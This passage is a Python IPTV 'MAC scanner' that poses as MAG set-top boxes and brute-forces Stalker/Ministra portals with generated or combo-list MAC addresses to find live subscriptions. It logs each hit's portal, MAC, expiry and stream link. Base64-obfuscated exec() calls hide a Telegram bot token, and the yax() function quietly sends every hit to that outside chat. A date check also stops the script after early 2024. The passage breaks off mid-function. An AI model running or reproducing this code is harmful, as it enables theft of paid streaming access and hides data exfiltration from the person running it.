import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re,marshal
#from playsound import playsound

nickn=""
if nickn=="":
        nickn=""
try:
        import androidhelper as sl4a
        ad = sl4a.Android()
except:pass
import subprocess
try:
        import threading
except:pass
import pathlib,base64

try:
        import requests
except:
        print("requests modul not found \n requests modul installing now... \n")
        pip.main(['install', 'requests'])
import requests
try:
        import sock
except:
        print("sock modul not found \n sock modul installing now \n")
        pip.main(['install', 'requests[socks]'] )
        pip.main(['install', 'sock'] )
        pip.main(['install', 'socks'] )
        pip.main(['install', 'PySocks'] )
import sock

getmac=""
oto=0
tur=0
Seri=""
csay=0
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from uuid import getnode as get_mac
#mac = "1102274947"#str(get_mac())
try:
        import cfscrape
        sesq= requests.Session()
        ses = cfscrape.create_scraper(sess=sesq)
except:
        ses= requests.Session()
logging.captureWarnings(True)
os.system('cls')



say1=0
say2=0
say=0
yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
prox=0
cpm=0
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
macSayisi=999999999999991# 1#deneme sayisı

feyzo=("""\33[0m\33[33m
      
    ██████╗░██╗░░██╗░██████╗░
    ██╔══██╗██║░██╔╝██╔════╝░
    ██████╔╝█████═╝░██║░░██╗░
    ██╔═══╝░██╔═██╗░██║░░╚██╗
    ██║░░░░░██║░╚██╗╚██████╔╝
    ╚═╝░░░░░╚═╝░░╚═╝░╚═════╝░
      \33[0m\33[0m\33[0m\33
\33[0;1;5;m
 """)

#################
nickn=input("""

        nick=""")
bekleme=1
isimle=""
print("\033[H\033[J", end="")
print(feyzo) 
#print(len(feyzo))
intro=("""\33[1;1m
        1= portal.php
        2= portal.php (White Cnf)
        3= portal.php (White Ultra)
        4= portal.php (Real Blue)
        5= server/load.php (Real Blue)   
        6= server/load.php
        7= stalker_portal
        8= c/server/load.php 
        9= c/portal.php 
        10= bs.msg.portal
        11= portalcc.php
        12= magload.php
        13= ministra/portal.php
        14= ministra/portal.php (realblue)
        15= portalstb/portal.php 
        16= k/portal.php (comet)
        17= maglove/portal.php 
        18= p/portal.php 
        19= magaccess 
        20= portalmega.php
        21= magportal
        22= powerfull
        25= real blue             

 Select portal type = \33[0m""")

a="""Enter panel:port = """
panel = input(intro)
print('\33[0m')
speed=""
buri=""
urib=""
uzmanc=""
uzmanm2=""
uzmanm="portal.php"
useragent="okhttp/4.7.1"

if  panel=="0":
        uzmanm=input('Yazınız=')
        useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(intro)
        
if  panel=="" or panel=="1":
        uzmanm="portal.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="2":
        uzmanm="portal.php"
        uzmanc="portal"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="3":
        uzmanm="portal.php"
        uzmanc="ultra"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="4":
        uzmanm="portal.php"
        uzmanc="realblue"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="5":
        uzmanm="server/load.php"
        uzmanc="realblue"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)
        
if panel=="6":
        uzmanm="server/load.php"
        buri="/c/"
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="7":
        uzmanm="stalker_portal/server/load.php"
        uzmanc="stalker"
        urib="/stalker_portal"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="8":
        uzmanm="c/server/load.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="9":
        uzmanm="c/portal.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="10":
        uzmanm="bs.mag.portal.php"
        buri="/c/" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="11":
        uzmanm="portalcc.php"
        buri="/c/" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="12":
        uzmanm="magLoad.php"
        buri="/c/" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="13":
        uzmanm="ministra/portal.php"
        uzmanm2="/ministra"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="14":
        uzmanm="ministra/portal.php"
        uzmanm2="/ministra"
        uzmanc="realblue"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="15":
        uzmanm="portalstb/portal.php"
        uzmanm2="/portalstb"
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="16":
        uzmanm="k/portal.php"
        uzmanm2="/k"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="17":
        uzmanm="maglove/portal.php"
        uzmanm2="/maglove"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="18":
        uzmanm="p/portal.php"
        uzmanm2="/p"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="19":
        uzmanm="magaccess/portal.php"
        uzmanm2="/magaccess"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="20":
        uzmanm="portalmega.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="21":
        uzmanm="magportal/portal.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

if panel=="22":
        uzmanm="powerfull/portal.php"
        uzmanm2="/powerfull"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(a)

realblue=""
if panel=="25":
        realblue="real"
        print("\033[H\033[J", end="")
        print(feyzo) 
        panel = input(intro)    



print(panel)

#       print(panel)#http://z.zcatt.cc/stalker_porta/c/
print("\033[H\033[J", end="")
print("\33[1;40m"+feyzo) 
kanalkata="0"
print("\033[H\033[J", end="")
print(feyzo) 
totLen="000000"
dosyaa=""
yeninesil=(
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
'00:1A:79:',
)
if "1"=="1":
        say=0
        dsy=""
        dsy="\n       \33[1;4;94;47m 0=  Random MAC  \33[0m\n"
        dir='/sdcard/combo/'
        file=len(feyzo)
        for files in os.listdir (dir):
                say=say+1
                dsy=dsy+"       "+str(say)+"= "+files+'\n'
        print ("""Select an option:
"""+dsy+"""
\33[1m""" +str(say)+""" Files found in combo folder
        """)
        dsyno=str(input(" \33[1mChoose combo = \33[1m"))
        say=0
        
        if dsyno=="":
                dsyno="0"
        if dsyno=="0":
                print("\033[H\033[J", end="")
                print(feyzo) 
                
                
                nnesil=str(yeninesil)
                nnesil=(nnesil.count(',')+1)
                for xd in range(0,(nnesil)):
                        tire='  》'
                        if int(xd) <9:
                                tire='   》'
                        print(str(xd+1)+tire+yeninesil[xd])
                
                
                
                
                mactur=input("\nSelect the mac type: ")
                if mactur=="":
                        mactur=14
                print(mactur)
                mactur=yeninesil[int(mactur)-1]
                print(mactur)
                print("\033[H\033[J", end="")
                print(feyzo)
                uz=input("""
 Number of macs to generate

  Quantity: """)
                if uz=="":
                        uz=1000000
                uz=int(uz) 
                print(uz)
        else:
                for files in os.listdir (dir):
                                say=say+1
                                if dsyno==str(say):
                                        dosyaa=(dir+files)
                                        break
                say=0
                if not dosyaa=="":
                        print(dosyaa)
                else:
                        print("\033[H\033[J", end="")
                        print("\033[H\033[J", end="")
                        print("Incorrect combo file selection")
                        quit()
                c=open(dosyaa, 'r')
                totLen=c.readlines()
                uz=(len(totLen))
        
        
        print("\033[H\033[J", end="")
        print(feyzo) 
        baslama=""

        if not baslama =="":
                baslama=int(baslama)
                csay=baslama
                
                
#print("\033[H\033[J", end="")
#print(feyzo)   

botsay=input("""\33[1m

   Number of bots

   The maximum is 15 bots\33[1m
      
 Bots: """)
print("\033[H\033[J", end="")
print(feyzo)
if botsay=="":
        botsay=int(2)
botsay=int(botsay)
                
kanalkata="0"
kanalkata=input("""\33[1m
 What do you want to show in the results?

        0= Connection data only
        1= Channels only
        2= Show everything (Live vod series)

 \33[1mOption: """)
if kanalkata=="":
        kanalkata="1"


gsay=0
vsay=0

if panel=="" :
    panel="center.chmedia.xyz:8080"

Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
exec(base64.b64decode('VE9LRU4gPSAnNTI1Mzc3MjMyMTpBQUZGbDhTX3VVY294MTZTbzc4Y0RUSDZHMlpjeW5hWE5vUScKQ0hBVF9JRCA9ICctMTAwMTY0MjkyNjU2MSc=')) 

    
print("\033[H\033[J", end="")
print(feyzo) 
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1

dosyaadi=str(input("""
Type the name of the new Hit File.
FileName="""))

if dosyaadi=="":
        dosyaadi="🖋🅿🅺🅶📚"
hits='/sdcard/Hits/'
if not os.path.exists(hits):
    os.mkdir(hits)
Dosyab=hits+dosyaadi+".txt"
hitsay=0
say=1
def yax(hits):
     
    exec(base64.b64decode('U0VORF9VUkwgPSBmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VE9LRU59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0NIQVRfSUR9JnRleHQ9e2hpdHN9Jw=='))
    exec(base64.b64decode('cmVxdWVzdHMuZ2V0KFNFTkRfVVJMKQ=='))
    dosya=open(Dosyab,'a+')
    print(hits)
    dosya.write(hits)
    dosya.close()
    exit
    
    

def month_string_to_number(ay):
   
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
import time
from datetime import date

def tarih_clear(trh):
        #trh=tarih_exp
        ay=""
        gun=""
        yil=""
        trai=""
        my_date=""
        sontrh=""
        out=""
        ay=str(trh.split(' ')[0])
        gun=str(trh.split(', ')[0].split(' ')[1])
        yil=str(trh.split(', ')[1])
        ay=str(month_string_to_number(ay))
        #print(ay)
        trai=str(gun)+'/'+str(ay)+'/'+str(yil)
        my_date = str(trai)
        #print(my_date)
        if 1==1:
                
                d = date(int(yil), int(ay), int(gun))
                sontrh = time.mktime(d.timetuple())
                out=(int((sontrh-time.time())/86400))
                return out
        #except:pass
        

macs="" 
sayi=1
b1hitc=0
b2hitc=0


def randommac():
        try:
                genmac = str(mactur)+"%02X:%02X:%02X"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
                #print(genmac)
        except:pass
        genmac=genmac.replace(':100',':10')
        return genmac



url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 


url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
 
if uzmanc=="stalker":
        url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&random="+str(random)+"&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22"+str(random)+"%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"


if uzmanc=="realblue":
        url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"

url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 

url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"

url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"

vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"

seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"




def url(cid):
        url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
        return url7

def hea1(macs):
        HEADERA={
"User-Agent":useragent ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
        return  HEADERA

        if uzmanc=="portal":
                try:
                        url="http://"+panel+"/c//version.js" 
                        res = ses.get(url,  headers=HEADERA, timeout=15, verify=False)
                        vir=str(res.text).split("'")[1].split("'")[0]
                except:pass
                url1="http://"+panel+"/portal.php?type=stb&action=handshake&token=1E3A20C221DF6C3EC477C30DBEFE8F07&prehash=6b1e45cc169162c9e876a29707236e54c24631db&JsHttpRequest=1-xml"

        if uzmanc=="realblue":
                HEADERA={
"User-Agent":useragent ,
"Referer": "http://"+panel+"/c/" ,
"X-User-Agent": "Model: MAG250; Link: WiFi",
"Cache-Control": "no-cache",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
                }
        return  HEADERA

        if uzmanc=="ultra":
                        HEADERA={
"X-User-Agent":"Model: MAG254; Link: Ethernet,WiFi",
"User-Agent":useragent , 
"Referer":"http://"+panel+"/c/", 
"Accept":"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
"Host":panel, 
"Cookie":"PHPSESSID=null; mac="+mac+"; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d", 
"Accept-Encoding":"gzip, deflate", 
"Content-Type":"text/javascript;charset=UTF-8", 
"Connection":"keep-alive", 
"X-Powered-By":"PHP/5.6.3", 
                        }
                        url1="http://"+panel+"/"+uzmanm+"php?type=stb&action=handshake&token=&prehash=0&mac="+mac+"&JsHttpRequest=1-xml" 

        
def hea2(macs,token):
                    HEADERd={
"User-Agent":useragent ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
                    }
                    return HEADERd
                    
                    if uzmanc=="ultra":
                        HEADERd={
"Authorization": "Bearer "+token,
"X-User-Agent":"Model: MAG254; Link: Ethernet,WiFi",
"User-Agent":useragent , 
"Referer":"http://"+panel+"/c/", 
"Accept":"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
"Host":panel, 
"Cookie":"PHPSESSID=null; mac="+mac+"; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d", 
"Accept-Encoding":"gzip, deflate", 
"Content-Type":"text/javascript;charset=UTF-8", 
"Connection":"keep-alive", 
"X-Powered-By":"PHP/5.6.3", 
                        }
                    return HEADERd

                    if uzmanc=="portal":
                        url2="http://"+panel+"/portal.php?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r23-254;%20ImageDate:%20Wed%20Oct%2031%2015:22:54%20EEST%202018;%20PORTAL%20version:%20"+vir+";%20API%20Version:%20JS%20API%20version:%20343;%20STB%20API%20version:%20146;%20Player%20Engine%20version:%200x58c&num_banks=2&sn="+SNCUT+"&client_type=STB&image_version=218&video_out=hdmi&device_id="+DEVENC+"&device_id2="+DEVENC+"&signature=1275CE35F07BABFAABCBFD3AF0A94790C5B5E619D3354942BD4009F375F94CD4&auth_second_step=1&hw_version=2.6-IB-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22"+SNCUT+"%22%2C%22type%22%3A%22STB%22%2C%22model%22%3A%22MAG254%22%2C%22uid%22%3A%22394EF2DA299FEDEB10410611EC0D4DCC82152444EB1DFD9B86D65C35AAD584EB%22%2C%22random%22%3A%22random%22%3A%22%22%7D&hw_version_2=39d95ea1affa08953d5951afeb1fbe57f8ffc23a&timestamp=1634575872&api_signature=262&prehash=9036d5f7dc752a23dfc087de916552a2de3e70bb&JsHttpRequest=1-xml"
                                                    
                    if uzmanc=="realblue":
                        HEADERd={
"User-Agent":useragent ,
"Referer": "http://"+panel+"/c/" ,
"X-User-Agent": "Model: MAG250; Link: WiFi",
"Cache-Control": "no-cache",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"Authorization": "Bearer "+token,
                        }
                    return HEADER


def hea3():
        hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
        }
        return hea
        

hityaz=0        
        
def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi):
        global hitr
        global hityaz
        
        try:
                imza="""
        
╭─➤Scan Date/Time➤"""+str(time.strftime('%d-%m-%Y'))+"""/"""+str(time.strftime('%H:%M:%S'))+"""    
├●Real ➤ """+str(real)+""""""+str(uzmanm2)+""""""+str(buri)+"""
├●Panel ➤ http://"""+str(panel)+""""""+str(urib)+""""""+str(uzmanm2)+""""""+str(buri)+"""
├●Mac ➤ """+str(mac)+"""
├●Exp ➤ """+str(trh)+"""
├●🔸SN:"""+SNENC+"""
├●🔸𝗛𝗶𝘁𝘀 ʙʏ """+str(nickn)+"""
├●🔸SNCUT:"""+SNCUT+"""
├─●🔸Device ID1:
├●"""+DEVENC+"""
├─●🔸Device ID2:
├●"""+SINGENC+"""
 """+str(playerapi)+"""    
╰──●m3uLink ➤ """+str(m3ulink)+"""
 """
                if len(kanalsayisi) > 1:
                        imza=imza+"""
╭─➤ Channels ➤"""+str(kanalsayisi)+"""
├● Vod ➤"""+str(filmsayisi)+"""
╰─➤ Series ➤"""+str(dizisayisi)+""" """
                if  kanalkata=="1" or kanalkata=="2":
                        imza=imza+"""╭─●🅻🅸🆅🅴🅻🅸🆂🆃─➤
╰─➤"""+str(livelist)+""" """
                if kanalkata=="hata":
                        imza=imza+"""
╭─●🆅🅾🅳🅻🅸🆂🆃─➤
╰─➤"""+str(vodlist)+"""
╭─●🆂🅴🆁🅸🅴🆂🅻🅸🆂🆃─➤
╰─➤"""+str(serieslist)+"""
"""


                
                yax(imza)
                print("WELCOME")
                hityaz=hityaz+1
                print(imza)
                if hityaz >= hitc:
                        hitr="\33[1;33m"
        except:pass
        
cpm=0
cpmx=0
hitr="\33[1m"



def echok(mac,bot,total,hitc,oran,tokenr):
        global cpm
        global hitr
        try:
        #global cpmx
                cpmx=(time.time()-cpm)
                cpmx=(round(60/cpmx))
                #cpm=cpmx
                if str(cpmx)=="0":
                        cpm=cpm
                else:
                        cpm=cpmx
                echo=("""
╭─●\33[1m ✴️IPTV MAC SCANNER✴️       
├●\33[1;7m """+str(panel)+""" \33[0m     
├─●  """+tokenr+str(mac)+"""  \33[0m
├──●  \33[33m"""+str(hitr)+"""Hit="""+str(hitc)+"""\33[0m  \33[1;33m%"""+str(oran)+"""  \33[1;33mCPM="""+str(cpm)+"""  \33[0m
╰───●  \33[1m"""+str(bot)+"""  \33[1m Total="""+str(total)+"""   \33[0m""")
                print(echo)
                cpm=time.time()
        except:pass
                        
        

def vpnip(ip):
        url9="https://freegeoip.app/json/"+ip
        vpnip=""
        veri=""
        try:
                res = ses.get(url9,  timeout=7, verify=False)
                veri=str(res.text)
                if not '404 page' in veri:
                        vpnips=veri.split('"country_name":"')[1]
                        vpnc=veri.split('"city":"')[1].split('"')[0]
                        vpn=vpnips.split('"')[0]+' / ' + vpnc
                else:
                        vpn="Not Invalid"
        except:
                vpn="Not Invalid"
        return vpn

def goruntu(link):
        try:
                res = ses.get(link,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
                duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
                if res.status_code==302:
                         duru="🆅🅰🆁 ✅😎 "
        except:
                duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
        return duru

if int(time.time()) >= int(1704056400.0):
                quit()
                                                
tokenr="\33[1m"                                                         
def hitprint(mac,trh):
	sesdosya="/sdcard/iptv/hit.mp3"
	file = pathlib.Path(sesdosya)
	try:
		if file.exists():
		    ad.mediaPlay(sesdosya)
		    
	except:pass
	print('     🌟 🌟 🇭‌🇮‌🇹‌🌟 🌟   \n  '+str(mac)+'\n  ' + str(trh))
        
        

def list(listlink,macs,token,livel):
        kategori=""
        veri=""
        bag=0
        while True:
                try:
                        res = ses.get(listlink, headers=hea2(macs,token), timeout=15, verify=False)
                        veri=str(res.text)
                        break
                except:
                        bag=bag+1
                        time.sleep(1)
                        if bag==12:
                                break
                        
        if veri.count('title":"')>1:
                        for i in veri.split('title":"'):
                                try:
                                        kanal=""
                                        kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
                                except:pass
                                kategori=kategori+kanal+livel
        
        list=kategori
        return list

def m3uapi(playerlink,macs,token):
        mt=""
        bag=0
        
        while True:
                        try:
                                res = ses.get(playerlink, headers=hea2(macs,token), timeout=7, verify=False)
                                veri=""
                                veri=str(res.text)
                                break
                        except:
                                time.sleep(1)
                                bag=bag+1
                                if bag==6:
                                        break
        try:
                        acon=""
                        if 'active_cons' in veri:
                                acon=veri.split('active_cons":')[1]
                                acon=acon.split(',')[0]
                                acon=acon.replace('"',"")
                                
                                
                                mcon=veri.split('max_connections":')[1]
                                mcon=mcon.split(',')[0]
                                mcon=mcon.replace('"',"")
                                
                                status=veri.split('status":')[1]
                                status=status.split(',')[0]
                                status=status.replace('"',"")
                                
                                timezone=veri.split('timezone":"')[1]
                                timezone=timezone.split('",')[0]
                                timezone=timezone.replace("\/","/")
                                
                                realm=veri.split('url":')[1]
                                realm=realm.split(',')[0]
                                realm=realm.replace('"',"")
                                
                                port=veri.split('port":')[1]
